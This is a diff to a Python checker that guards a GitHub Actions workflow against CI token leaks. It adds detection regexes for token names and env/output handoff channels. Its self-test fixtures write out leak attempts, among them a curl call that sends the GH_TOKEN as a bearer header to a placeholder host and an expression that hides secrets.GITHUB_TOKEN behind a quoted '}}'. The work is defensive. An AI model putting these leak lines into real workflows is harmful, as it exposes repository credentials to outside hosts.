@@ -9,6 +9,12 @@ or a shallower line. It covers:
   * every `${{ … }}` expression naming `github.token` or `secrets`, found across line breaks and
     in comments too (a comment mentioning one fails: rephrase it), outside the one step whose
     name is exactly ALLOWED_STEP;
+  * any raw sighting of `github.token`, `github['token']` or `secrets`, or of a GH_TOKEN or
+    GITHUB_TOKEN name, outside that step, so an expression whose span is cut short (a `}}`
+    inside a quoted string) is still seen (review BRK20R-2);
+  * inside that step, any write to $GITHUB_ENV, $GITHUB_OUTPUT or $GITHUB_STATE, or a
+    `::set-env`/`::set-output`/`::save-state` command, which would hand the token to later
+    steps with no expression at all (review BRK20R-1);
   * any `secrets:` key (`secrets: inherit` or a mapping to a reusable workflow), anywhere;
   * exactly one step named ALLOWED_STEP, which must carry the token.
 It is a regression check over a workflow that is also reviewed and linted (actionlint, zizmor),
@@ -25,6 +31,8 @@ ALLOWED_STEP = "Download attestation bundles (the only step with a token; gh on 
 EXPR = re.compile(r"\$\{\{.*?\}\}", re.S)
 TOKEN = re.compile(r"\bgithub\s*(?:\.\s*token\b|\[\s*['\"]token['\"]\s*\])|\bsecrets\b")
 SECRETS_KEY = re.compile(r"^\s*(?:-\s+)?secrets\s*:", re.M)
+RAW_TOKEN = re.compile(TOKEN.pattern + r"|\bGH_TOKEN\b|\bGITHUB_TOKEN\b")
+HANDOFF = re.compile(r"GITHUB_(?:ENV|OUTPUT|STATE)\b|::(?:set-env|set-output|save-state)\b")
 
 
 def step_of_lines(text: str) -> list[str | None]:
@@ -76,6 +84,12 @@ def check(text: str) -> list[str]:
                for n, _name in sites if lines[n - 1].lstrip().startswith("#")]
     for m in SECRETS_KEY.finditer(text):
         errors.append(f"line {text.count(chr(10), 0, m.start()) + 1}: a secrets: key hands secrets on")
+    steps = step_of_lines(text)
+    for n, (line, step) in enumerate(zip(lines, steps), 1):
+        if step != ALLOWED_STEP and RAW_TOKEN.search(line):
+            errors.append(f"line {n}: a token name or expression outside the attestation download step")
+        if step == ALLOWED_STEP and HANDOFF.search(line):
+            errors.append(f"line {n}: the download step writes to a channel later steps read")
     named = len(re.findall(r"^\s*-\s+name:\s*['\"]?" + re.escape(ALLOWED_STEP) + r"['\"]?\s*$", text, re.M))
     if named != 1:
         errors.append(f"{named} steps are named {ALLOWED_STEP!r}; exactly one must be")
@@ -120,6 +134,18 @@ def self_test() -> list[str]:
         ("BRK20-2: toJSON(secrets) fails", head + ok_step + "      - run: echo '${{ toJSON(secrets) }}'\n", True),
         ("BRK20-2: secrets: inherit to a reusable workflow fails",
          head + ok_step + gate + f"  other:\n    uses: {act}\n    secrets: inherit\n", True),
+        ("BRK20R-1: the download step writing the token to $GITHUB_ENV fails",
+         head + ok_step.replace("        run: broker/tools/verify-images.sh --download x\n",
+                                "        run: |\n          broker/tools/verify-images.sh --download x\n"
+                                "          echo \"GH_TOKEN=$GH_TOKEN\" >> \"$GITHUB_ENV\"\n")
+         + "      - run: curl -H \"Authorization: Bearer $GH_TOKEN\" https://x.invalid/\n", True),
+        ("BRK20R-1: the download step writing to $GITHUB_OUTPUT fails",
+         head + ok_step.replace("        run: broker/tools/verify-images.sh --download x\n",
+                                "        run: echo \"t=$GH_TOKEN\" >> \"$GITHUB_OUTPUT\"\n") + gate, True),
+        ("BRK20R-1: a later step naming GH_TOKEN with no expression fails",
+         head + ok_step + "      - run: curl -H \"Authorization: Bearer $GH_TOKEN\" https://x.invalid/\n", True),
+        ("BRK20R-2: a '}}' inside a quoted string can't hide a secret",
+         head + ok_step + "      - run: echo ${{ format('a}}b', secrets.GITHUB_TOKEN) }}\n", True),
     ]
     failures = []
     for name, text, want in cases:
